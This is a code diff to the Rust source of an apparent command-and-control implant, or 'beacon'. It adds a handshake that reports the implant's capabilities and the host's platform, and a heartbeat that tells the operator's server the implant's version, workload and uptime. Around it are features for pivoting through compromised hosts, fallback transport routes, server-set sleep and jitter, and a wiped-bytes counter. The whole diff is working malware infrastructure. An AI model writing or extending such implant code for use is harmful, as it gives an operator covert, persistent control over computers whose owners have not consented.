@@ -73,8 +73,6 @@ const MAX_REKEY_ROUNDS: usize = 8;
 fn hello_meta(peer_addr: &str) -> Value {
     let mut meta = sysinfo::meta(VERSION);
     if let Value::Map(ref mut fields) = meta {
-        let caps: Vec<Value> = task::capabilities().into_iter().map(upk::s).collect();
-        fields.insert("caps".to_string(), upk::arr(caps));
         // Where the peer listener waits: the server chains a pivot
         // through this host when it knows the address.
         if !peer_addr.is_empty() {
@@ -82,6 +80,30 @@ fn hello_meta(peer_addr: &str) -> Value {
         }
     }
     meta
+}
+
+/// The capability list of this implant: the task kinds it can run.
+///
+/// The list travels in the handshake, so the server never queues a task
+/// the beacon cannot run and the operator sees the host's reach before
+/// the first command.
+pub fn hello_caps() -> Vec<Value> {
+    task::capabilities().into_iter().map(upk::s).collect()
+}
+
+/// The platform details of this host: the os, the architecture and the
+/// family the implant belongs to.
+pub fn hello_platform() -> Value {
+    let meta = sysinfo::meta(VERSION);
+    let mut pairs: Vec<(&str, Value)> = Vec::new();
+    if let Value::Map(ref fields) = meta {
+        for key in ["os", "arch", "family"] {
+            if let Some(value) = fields.get(key) {
+                pairs.push((key, value.clone()));
+            }
+        }
+    }
+    upk::map(pairs)
 }
 
 pub struct Beacon {
@@ -116,6 +138,8 @@ pub struct Beacon {
     /// The route the server pushed: the transport the beacon speaks and
     /// the order it may fall back in.
     route: Option<Route>,
+    /// When the implant started: the heartbeat carries the uptime.
+    started_at: std::time::Instant,
 }
 
 impl Beacon {
@@ -139,6 +163,7 @@ impl Beacon {
             wiped_bytes: 0,
             peer_addr: String::new(),
             route: None,
+            started_at: std::time::Instant::now(),
         }
     }
 
@@ -527,6 +552,13 @@ impl Beacon {
         // (the p2p task does that), so the address is read every time.
         let peer = crate::tunnel::peer_address();
         let meta = hello_meta(&peer);
+        let hello = crate::link::Hello {
+            version: crate::wire::HELLO_VERSION,
+            caps: hello_caps(),
+            implant_version: VERSION.to_string(),
+            abi: crate::wire::ABI_VERSION,
+            platform: hello_platform(),
+        };
         let handshake = {
             let channel = self.channel.as_mut().ok_or("the channel is closed")?;
             crate::link::client_handshake(
@@ -536,6 +568,7 @@ impl Beacon {
                 &self.cfg.agent_id,
                 suite,
                 meta,
+                &hello,
             )?
         };
         let session_id = handshake.session_id.clone();
@@ -713,6 +746,12 @@ impl Beacon {
                 }
             }
         }
+
+        // The heartbeat: the small frame that says "still here, this is
+        // what I am".  It is sent after the batch, because a frame that
+        // is sent between the check-in and the batch would be sealed with
+        // the old keys when the server has already switched.
+        self.send_heartbeat(tasks.len())?;
 
         // Server-side beacon policy wins over the compiled-in defaults.
         self.apply_policy(batch.u64_or("sleep", self.cfg.sleep), batch.u64_or("jitter", self.cfg.jitter as u64) as u32);
@@ -912,6 +951,23 @@ impl Beacon {
     /// A chunk is a partial result: the task is still running, so the server
     /// appends the chunk instead of completing the task.  When a session ends,
     /// its exit status completes the task.
+    /// Send the heartbeat: the cheap signal that the implant is alive.
+    ///
+    /// The heartbeat says what the implant is and how much work it is
+    /// carrying.  The server shows it next to the host, so an operator
+    /// can tell "the host is busy" from "the host is gone".
+    fn send_heartbeat(&mut self, busy: usize) -> Result<(), String> {
+        let value = upk::map(vec![
+            ("v", upk::u(1)),
+            ("iver", upk::s(VERSION)),
+            ("abi", upk::u(crate::wire::ABI_VERSION as u64)),
+            ("busy", upk::u(busy as u64)),
+            ("up", upk::u(self.started_at.elapsed().as_secs())),
+        ]);
+        let frame = self.seal(wire::MSG_HEARTBEAT, &value)?;
+        self.write(&frame)
+    }
+
     fn drain_backgrounds(&mut self) -> Result<(), String> {
         // Collect first and send afterwards: sending borrows the session.
         let mut pending: Vec<(String, String, Vec<u8>)> = Vec::new();
